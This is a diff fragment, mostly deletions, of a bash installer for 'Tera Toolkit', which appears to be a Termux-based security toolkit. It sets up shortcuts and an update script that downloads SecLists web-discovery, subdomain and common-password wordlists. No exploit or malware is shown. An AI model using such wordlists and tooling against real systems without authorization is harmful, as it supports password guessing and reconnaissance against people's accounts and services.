-    echo 'alias tera-update="cd ~/tera-toolkit && ./update.sh"' >> ~/.bashrc
-    
-    # Install termux-api for additional features
-    pkg install -y termux-api
-    
-    # Create desktop shortcut
-    mkdir -p ~/.shortcuts
-    cat > ~/.shortcuts/TeraToolkit << 'EOF'
-#!/data/data/com.termux/files/usr/bin/bash
-cd ~/tera-toolkit
-./tera.sh
-EOF
-    chmod +x ~/.shortcuts/TeraToolkit
-    
-    # Create widget
-    cat > ~/.shortcuts/TeraWidget << 'EOF'
-#!/data/data/com.termux/files/usr/bin/bash
-echo "Tera Toolkit"
-echo "Ready to use!"
-EOF
-    chmod +x ~/.shortcuts/TeraWidget
-    
-    echo -e "${GREEN}[✓] Termux configured${NC}"
-}
-
-# Function to create update script
-create_update_script() {
-    section "Creating Update System"
-    
-    cat > ~/tera-toolkit/update.sh << 'EOF'
-#!/bin/bash
-# Update script for Tera Toolkit
-
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-YELLOW='\033[1;33m'
-CYAN='\033[0;36m'
-NC='\033[0m'
-
-echo -e "${CYAN}"
-echo "    ╔═══════════════════════════════════════════════════╗"
-echo "    ║              TERA TOOLKIT UPDATER                 ║"
-echo "    ╚═══════════════════════════════════════════════════╝"
-echo -e "${NC}"
-
-cd ~/tera-toolkit
-
-echo -e "${YELLOW}[*] Checking for updates...${NC}"
-
-# Backup current version
-echo -e "${BLUE}[*] Backing up current version...${NC}"
-tar -czf tera_backup_$(date +%Y%m%d).tar.gz tera.sh tera.conf wordlists/
-
-# Update wordlists
-echo -e "${BLUE}[*] Updating wordlists...${NC}"
-cd wordlists
-wget -q -O common.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
-wget -q -O subdomains.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt
-wget -q -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt
-cd ..
-
-echo -e "${GREEN}[✓] Tera Toolkit updated successfully!${NC}"
-echo -e "${YELLOW}[*] Restart Tera Toolkit to apply changes${NC}"
-EOF
-    
-    chmod +x ~/tera-toolkit/update.sh
-    
-    # Create check for updates script
-    cat > ~/tera-toolkit/check_update.sh << 'EOF'
-#!/bin/bash
-# Check for Tera Toolkit updates
-
-echo "[*] Checking Tera Toolkit version..."
-current_version="3.0"
-echo "[*] Current version: $current_version"
-echo "[*] Latest version: Check GitHub repository"
-echo ""
-echo "To update: ./update.sh"
-EOF
-    
-    chmod +x ~/tera-toolkit/check_update.sh
-    
-    echo -e "${GREEN}[✓] Update system created${NC}"
-}
-
-# Function to create documentation
-create_documentation() {
-    section "Creating Documentation"
-    
-    cat > ~/tera-toolkit/README.md << 'EOF'
-# Tera Toolkit v3.0
-
-## Ultimate Security Toolkit
-
-### Quick Start
-```bash
-cd ~/tera-toolkit
-./tera.sh
+# --- Start Tera Toolkit ---
+init
